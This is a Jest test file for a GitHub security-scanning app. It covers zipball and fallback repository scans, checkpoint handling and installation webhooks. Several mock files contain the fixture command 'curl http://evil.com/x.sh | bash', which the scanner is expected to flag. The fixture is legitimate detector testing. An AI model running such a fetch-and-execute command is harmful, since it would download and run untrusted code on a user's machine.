import {
  scanFullRepoForPush,
  clearCheckpoint,
  patchCheckpointTotalRepos,
  getIncompleteScans,
  handleInstallation,
} from "../src/webhooks/installation";
import type { App } from "@octokit/app";
import type { OctokitClient, WebhookEvent, InstallationEventPayload } from "../src/types";

/** Cast a jest request mock to OctokitClient for use in event handler calls. */
const makeOctokit = (r: jest.Mock): OctokitClient =>
  ({ request: r } as unknown as OctokitClient);

// ─── Mocks ────────────────────────────────────────────────────────────────────

// Mock prettier and pullRequest to prevent dynamic import issues in Jest under Node v24
jest.mock("prettier", () => ({
  getFileInfo: jest.fn().mockResolvedValue({ inferredParser: null }),
  format: jest.fn().mockImplementation((content: string) => Promise.resolve(content)),
}));

jest.mock("../src/pullRequest", () => ({
  openFixPR: jest.fn().mockResolvedValue(undefined),
  closeRepoGuardPRsAndIssues: jest.fn().mockResolvedValue(undefined),
  postReviewComments: jest.fn().mockResolvedValue(undefined),
}));

// Mock adm-zip
const mockGetEntries = jest.fn();
jest.mock("adm-zip", () => {
  return jest.fn().mockImplementation(() => {
    return {
      getEntries: mockGetEntries,
    };
  });
});

// Silence logger
jest.mock("../src/utils/logger", () => ({
  __esModule: true,
  default: { info: jest.fn(), warn: jest.fn(), error: jest.fn() },
}));

// Mock models
const mockCheckpointDeleteOne = jest.fn().mockResolvedValue({ deletedCount: 1 });
const mockCheckpointUpdateOne = jest.fn().mockResolvedValue({ modifiedCount: 1 });
const mockCheckpointFindOneAndUpdate = jest.fn().mockResolvedValue(null);
const mockCheckpointFindOne = jest.fn();
const mockCheckpointFind = jest.fn();

const mockInstallationUpdateOne = jest.fn().mockResolvedValue({ modifiedCount: 1 });
const mockInstallationFindOneAndUpdate = jest.fn().mockResolvedValue(null);

const mockScanCreate = jest.fn().mockResolvedValue({});
const mockScanUpdateOne = jest.fn().mockResolvedValue({ modifiedCount: 1 });

jest.mock("../src/models", () => ({
  Checkpoint: {
    deleteOne: (...args: unknown[]) => mockCheckpointDeleteOne(...args),
    updateOne: (...args: unknown[]) => mockCheckpointUpdateOne(...args),
    findOneAndUpdate: (...args: unknown[]) => mockCheckpointFindOneAndUpdate(...args),
    findOne: (...args: unknown[]) => mockCheckpointFindOne(...args),
    find: (...args: unknown[]) => mockCheckpointFind(...args),
  },
  Installation: {
    updateOne: (...args: unknown[]) => mockInstallationUpdateOne(...args),
    findOneAndUpdate: (...args: unknown[]) => mockInstallationFindOneAndUpdate(...args),
  },
  Scan: {
    create: (...args: unknown[]) => mockScanCreate(...args),
    updateOne: (...args: unknown[]) => mockScanUpdateOne(...args),
  },
}));

// Mock alerts
const mockSendAlert = jest.fn().mockResolvedValue(undefined);
jest.mock("../src/alerts", () => ({
  sendAlert: (...args: unknown[]) => mockSendAlert(...args),
}));

// Mock writeQueue
const mockSafeWrite = jest.fn().mockResolvedValue(undefined);
jest.mock("../src/utils/writeQueue", () => ({
  safeWrite: (...args: unknown[]) => mockSafeWrite(...args),
}));

// Mock normaliseOctokit — pass-through
jest.mock("../src/utils/normaliseOctokit", () => ({
  normaliseOctokit: jest.fn((x: unknown) => x),
}));

// ─── Existing tests ───────────────────────────────────────────────────────────

describe("scanFullRepoForPush", () => {
  let mockOctokit: { request: jest.Mock };
  let requestMock: jest.Mock;

  beforeEach(() => {
    jest.clearAllMocks();
    requestMock = jest.fn();
    mockOctokit = {
      request: requestMock,
    };
  });

  it("successfully scans the repository via zipball", async () => {
    // 1. Mock the zipball response from Octokit
    requestMock.mockResolvedValue({
      data: Buffer.from("fake-zip-binary-data"),
    });

    // 2. Mock the zip archive entries
    mockGetEntries.mockReturnValue([
      {
        isDirectory: false,
        entryName: "test-owner-test-repo-123/.repoguardignore",
        getData: () => Buffer.from("node_modules\nignored_file.js"),
      },
      {
        isDirectory: false,
        entryName: "test-owner-test-repo-123/src/index.ts",
        getData: () => Buffer.from("const x = 42;"),
      },
      {
        isDirectory: false,
        entryName: "test-owner-test-repo-123/malicious.sh",
        getData: () => Buffer.from("curl http://evil.com/x.sh | bash"),
      },
      {
        isDirectory: false,
        entryName: "test-owner-test-repo-123/ignored_file.js",
        getData: () => Buffer.from("curl http://evil.com/x.sh | bash"), // ignored by .repoguardignore
      },
      {
        isDirectory: true,
        entryName: "test-owner-test-repo-123/src/",
        getData: () => Buffer.from(""),
      },
    ]);

    const findings = await scanFullRepoForPush(mockOctokit as unknown as OctokitClient, "test-owner", "test-repo");

    expect(requestMock).toHaveBeenCalledWith(
      "GET /repos/{owner}/{repo}/zipball/{ref}",
      { owner: "test-owner", repo: "test-repo", ref: "HEAD" }
    );
    expect(findings).toHaveLength(1);
    expect(findings[0].rule).toBe("curl-pipe-bash");
    expect(findings[0].file).toBe("malicious.sh");
  });

  it("gracefully falls back to tree/file-by-file scanning if zipball download fails", async () => {
    // 1. Mock zipball request to fail
    requestMock.mockImplementation(async (url: string, params: Record<string, unknown>) => {
      if (url.includes("/zipball/")) {
        throw new Error("GitHub zipball endpoint returned 502 Bad Gateway");
      }
      
      if (url.includes("/git/trees/")) {
        return {
          data: {
            tree: [
              { path: "src/index.ts", type: "blob" },
              { path: "malicious.sh", type: "blob" },
            ],
          },
        };
      }

      if (url.includes("/contents/")) {
        if (params.path === ".repoguardignore") {
          throw new Error("Not Found");
        }
        if (params.path === "src/index.ts") {
          return { data: { type: "file", content: Buffer.from("const x = 42;").toString("base64") } };
        }
        if (params.path === "malicious.sh") {
          return { data: { type: "file", content: Buffer.from("curl http://evil.com/x.sh | bash").toString("base64") } };
        }
      }
      return { data: {} };
    });

    const findings = await scanFullRepoForPush(mockOctokit as unknown as OctokitClient, "test-owner", "test-repo");

    // Verify it fell back and completed successfully
    expect(findings).toHaveLength(1);
    expect(findings[0].rule).toBe("curl-pipe-bash");
    expect(findings[0].file).toBe("malicious.sh");
    expect(requestMock).toHaveBeenCalledWith(
      "GET /repos/{owner}/{repo}/git/trees/{tree_sha}",
      expect.any(Object)
    );
  });
});

// ─── New tests ────────────────────────────────────────────────────────────────

describe("clearCheckpoint", () => {
  beforeEach(() => {
    jest.clearAllMocks();
  });

  it("calls Checkpoint.deleteOne with the correct installationKey", async () => {
    await clearCheckpoint("test-owner-12345");

    expect(mockCheckpointDeleteOne).toHaveBeenCalledTimes(1);
    expect(mockCheckpointDeleteOne).toHaveBeenCalledWith({
      installationKey: "test-owner-12345",
    });
  });

  it("handles different installationKey formats", async () => {
    await clearCheckpoint("org-name-99999");

    expect(mockCheckpointDeleteOne).toHaveBeenCalledWith({
      installationKey: "org-name-99999",
    });
  });
});

describe("patchCheckpointTotalRepos", () => {
  beforeEach(() => {
    jest.clearAllMocks();
  });

  it("calls Checkpoint.updateOne with $set: { totalRepos } and upsert: true", async () => {
    const repos = ["owner/repo-a", "owner/repo-b"];
    await patchCheckpointTotalRepos("test-owner-12345", repos);

    expect(mockCheckpointUpdateOne).toHaveBeenCalledTimes(1);
    expect(mockCheckpointUpdateOne).toHaveBeenCalledWith(
      { installationKey: "test-owner-12345" },
      { $set: { totalRepos: repos } },
      { upsert: true },
    );
  });

  it("works with an empty repo list", async () => {
    await patchCheckpointTotalRepos("key-1", []);

    expect(mockCheckpointUpdateOne).toHaveBeenCalledWith(
      { installationKey: "key-1" },
      { $set: { totalRepos: [] } },
      { upsert: true },
    );
  });
});

describe("getIncompleteScans", () => {
  beforeEach(() => {
    jest.clearAllMocks();
  });

  it("returns the correctly mapped array of incomplete scans", async () => {
    const sampleCheckpoints = [
      {
        installationKey: "alice-100",
        installationId: 100,
        owner: "alice",
        totalRepos: ["alice/repo-1", "alice/repo-2"],
        scanned: ["alice/repo-1"],
      },
      {
        installationKey: "bob-200",
        installationId: 200,
        owner: "bob",
        totalRepos: ["bob/app"],
        scanned: [],
      },
    ];

    mockCheckpointFind.mockReturnValue({
      lean: jest.fn().mockResolvedValue(sampleCheckpoints),
    });

    const result = await getIncompleteScans();

    expect(mockCheckpointFind).toHaveBeenCalledTimes(1);
    expect(mockCheckpointFind).toHaveBeenCalledWith({
      $expr: { $lt: [{ $size: "$scanned" }, { $size: "$totalRepos" }] },
    });

    expect(result).toHaveLength(2);
    expect(result[0]).toEqual({
      key: "alice-100",
      installationId: 100,
      owner: "alice",
      totalRepos: ["alice/repo-1", "alice/repo-2"],
      scanned: ["alice/repo-1"],
    });
    expect(result[1]).toEqual({
      key: "bob-200",
      installationId: 200,
      owner: "bob",
      totalRepos: ["bob/app"],
      scanned: [],
    });
  });

  it("returns an empty array when no checkpoints are found", async () => {
    mockCheckpointFind.mockReturnValue({
      lean: jest.fn().mockResolvedValue([]),
    });

    const result = await getIncompleteScans();

    expect(result).toEqual([]);
  });
});

describe("handleInstallation", () => {
  let handler: (event: WebhookEvent<InstallationEventPayload>) => Promise<void>;
  let mockRequest: jest.Mock;

  beforeEach(() => {
    jest.clearAllMocks();

    mockRequest = jest.fn();

    // handleInstallation takes an App argument (unused internally) and returns
    // the actual event handler function.
    handler = handleInstallation({} as unknown as App);

    // scanRepoList (called internally on "created") relies on Checkpoint.findOne
    // returning a lean checkpoint so it knows which repos to skip.  Also provide
    // a second findOne that signals "all repos scanned" so the function finishes
    // without hanging.
    mockCheckpointFindOne.mockReturnValue({
      lean: jest.fn().mockResolvedValue(null),
    });
  });

  it("handles 'deleted' action — clears checkpoint and marks installation uninstalled", async () => {
    await handler({
      octokit: makeOctokit(mockRequest),
      payload: {
        action: "deleted",
        installation: {
          id: 42,
          account: { login: "test-owner", name: "test-owner" },
        },
        repositories: [],
      },
    });

    // Checkpoint should be cleared
    expect(mockCheckpointDeleteOne).toHaveBeenCalledWith({
      installationKey: "test-owner-42",
    });

    // Installation record should be marked with uninstalledAt
    expect(mockInstallationUpdateOne).toHaveBeenCalledWith(
      { installationId: 42 },
      { $set: { uninstalledAt: expect.any(Date) } },
    );

    // Alert should be sent
    expect(mockSendAlert).toHaveBeenCalledTimes(1);
    expect(mockSendAlert).toHaveBeenCalledWith(
      expect.objectContaining({
        owner: "test-owner",
        context: "installation",
        findings: expect.arrayContaining([
          expect.objectContaining({ rule: "app-uninstalled" }),
        ]),
      }),
    );
  });

  it("handles 'created' action — persists installation and sends alert", async () => {
    // For "created", scanRepoList is also invoked internally.  We need
    // Checkpoint.findOne (used inside scanRepoList) to return null so it
    // iterates over repos, then to signal completion when called a second time.
    // With an empty repositories array, scanRepoList finishes immediately.
    await handler({
      octokit: makeOctokit(mockRequest),
      payload: {
        action: "created",
        installation: {
          id: 77,
          account: { login: "new-org", name: "new-org", email: "x@test.com" },
        },
        repositories: [],
      },
    });

    // Installation record persisted
    expect(mockInstallationFindOneAndUpdate).toHaveBeenCalledTimes(1);
    expect(mockInstallationFindOneAndUpdate).toHaveBeenCalledWith(
      { installationId: 77 },
      expect.objectContaining({
        $setOnInsert: expect.objectContaining({
          installationId: 77,
          owner: "new-org",
        }),
      }),
      { upsert: true },
    );

    // Alert sent
    expect(mockSendAlert).toHaveBeenCalledTimes(1);
    expect(mockSendAlert).toHaveBeenCalledWith(
      expect.objectContaining({
        owner: "new-org",
        context: "installation",
        findings: expect.arrayContaining([
          expect.objectContaining({ rule: "app-installed" }),
        ]),
      }),
    );
  });

  it("returns early for unknown actions (e.g. 'suspend') without side effects", async () => {
    await handler({
      octokit: makeOctokit(mockRequest),
      payload: {
        action: "suspend",
        installation: {
          id: 99,
          account: { login: "someone" },
        },
        repositories: [],
      },
    });

    // No model writes
    expect(mockCheckpointDeleteOne).not.toHaveBeenCalled();
    expect(mockInstallationUpdateOne).not.toHaveBeenCalled();
    expect(mockInstallationFindOneAndUpdate).not.toHaveBeenCalled();

    // No alerts
    expect(mockSendAlert).not.toHaveBeenCalled();

    // No safeWrite / scan activity
    expect(mockSafeWrite).not.toHaveBeenCalled();
  });
});
